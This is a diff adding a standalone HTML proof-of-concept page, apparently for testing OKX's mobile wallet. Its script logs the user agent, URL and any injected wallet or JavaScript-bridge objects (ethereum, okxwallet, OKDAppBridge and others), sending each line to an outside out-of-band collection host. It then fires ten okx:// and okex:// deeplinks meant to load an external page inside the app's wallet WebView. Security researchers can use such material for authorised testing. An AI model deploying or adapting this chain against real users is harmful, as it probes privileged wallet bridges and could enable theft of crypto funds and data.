@@ -1,0 +1,57 @@
+<!doctype html>
+<html><head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
+<title>OKX in-app chain</title>
+<style>html,body{margin:0;padding:0;background:#000;color:#0f0;font:13px monospace}
+pre{padding:10px;white-space:pre-wrap;word-break:break-all;margin:0}
+button{display:block;width:90%;margin:10px auto;padding:18px;font-size:16px;
+background:#3573ff;color:#fff;border:0;border-radius:10px;touch-action:manipulation}</style>
+</head><body>
+<button id=go>▶ START CHAIN</button>
+<pre id=o>idle. tap START to begin in-app dispatch.\n</pre>
+<script>
+var COLLECT='https://xdhrflssxhuownkbsbgks7myap3kv1oo6.oast.fun/c';
+var V=(new URLSearchParams(location.search)).get('v')||'chain';
+function w(s){var l='['+V+'] '+s; document.getElementById('o').textContent+=l+'\n';
+  try{navigator.sendBeacon(COLLECT+'?l='+encodeURIComponent(l));}catch(e){}}
+
+w('chain page loaded');
+w('UA='+navigator.userAgent);
+w('href='+location.href);
+w('XRW(hint via UA only)='+(/wv|AgentWeb/.test(navigator.userAgent)?'IN-APP':'normal-browser'));
+
+// enumerate any provider injected RIGHT NOW (in case /goto/web shares context)
+['ethereum','okxwallet','OKDAppBridge','okJsBridge','okxJsBridge','JSBridge','OKApp'].forEach(function(n){
+  if(window[n]){var m='';try{m=Object.keys(window[n]).slice(0,12).join(',');}catch(e){}w('★ HAS '+n+' :: '+m);}
+});
+
+// list of in-app deeplinks to fire sequentially
+var DIAG='https%3A%2F%2Fnayssers.github.io%2Fdrave.html%3Fv%3D';
+var CHAIN=[
+  ['c1','okx://wallet/dapp/details?dappUrl='+DIAG+'c1'],
+  ['c2','okex://metaX/dapp/details?dappUrl='+DIAG+'c2'],
+  ['c3','okx://web3/dapp/details?dappUrl='+DIAG+'c3'],
+  ['c4','okx://wallet/dapp/details?dappUrl='+DIAG+'c4&chainId=1'],
+  ['c5','okx://wallet/dapp/details?dappUrl='+DIAG+'c5&chainId=1&walletId=0&jumpType=direct'],
+  ['c6','okx://wallet/dapp?dappUrl='+DIAG+'c6&tabName=Featured'],
+  ['c7','okex://metaX/dapp?dappUrl='+DIAG+'c7&tabName=Featured'],
+  ['c8','okx://wallet/nft/featured?page=cryptopediaDetail&chainId=1&cryptopediaId=1&dappUrl='+DIAG+'c8'],
+  ['c9','okx://wallet/nft/featured?page=cryptopediaTaskDetail&chainId=1&cryptopediaId=1&dappId=1&dappCategory=1&dappUrl='+DIAG+'c9'],
+  ['c10','okx://wallet/nft/featured?page=event_detail&eventId=1&dappUrl='+DIAG+'c10'],
+];
+
+document.getElementById('go').addEventListener('click', function(){
+  var i=0;
+  function next(){
+    if(i>=CHAIN.length){w('chain finished — none navigated us away');return;}
+    var pair=CHAIN[i++];
+    w('try '+pair[0]+' → '+pair[1].slice(0,80));
+    // Use location.href so OKX's WebView shouldOverrideUrlLoading() can intercept
+    try { window.location.href = pair[1]; } catch(e){ w('err='+e.message); }
+    // continue in 2.5s in case we're still here (deeplink rejected)
+    setTimeout(next, 2500);
+  }
+  next();
+});
+</script></body></html>
